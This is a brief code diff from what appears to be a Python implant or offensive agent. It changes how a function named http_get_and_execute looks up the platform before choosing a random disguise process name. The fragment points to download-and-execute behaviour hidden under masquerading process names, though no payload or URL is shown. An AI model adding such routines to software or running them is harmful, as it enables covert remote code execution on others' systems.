@@ -13,7 +13,7 @@ def get_parent_process(process_name):
 
 def http_get_and_execute(url):
     # Get random process name
-    platform = sys.get_os()["platform"]
+    platform = sys.info()["platform"]
     proc_name = PROC_NAMES[platform][random.int(
         0, len(PROC_NAMES[platform]))]
 
